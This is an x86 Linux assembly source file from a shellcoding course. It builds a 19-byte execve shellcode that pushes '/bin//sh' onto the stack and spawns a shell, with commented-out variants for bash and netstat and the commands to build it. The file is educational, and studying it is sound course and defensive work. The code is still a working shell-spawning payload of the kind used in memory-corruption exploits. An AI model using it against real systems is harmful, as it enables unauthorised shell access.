; Executable name       : execve2
; Designed OS           : Linux (32-bit)
; Author		: wetw0rk
; Version               : 1.0
; Created Following     : SLAE
; Description           : An example of execve usage in shellcode via the stack
;			  I got it down to 19 bytes :D!
;
; Build using these commands:
;       nasm -f elf32 -o execve2.o execve2.asm
;       ld -o execve2 execve2.o
;       objdump -D execve2 -M intel
;

SECTION .text

global _start

_start:

	xor eax,eax			; zero out the register
	push eax			; PUSH EAX onto the stack NULLS

	; EXAMPLE USING: ////bin/bash (12 characters)
;	push 0x68736162			; PUSH our command onto
;	push 0x2f6e6962			; the stack backwards.
;	push 0x2f2f2f2f			; ^

	; EXAMPLE USING: /bin//sh (8 characters)
	push 0x68732f2f
	push 0x6e69622f

	; EXAMPLE USING: /bin/netstat (8 characters)
;	push 0x74617473
;	push 0x74656e2f
;	push 0x6e69622f

	mov al,11                       ; make the execve() syscall

	mov ebx,esp			; MOV the address stored in ESP
					; which points to top of the stack,
					; which points to [<example>][NULLS]

	int 80h				; call the kernel

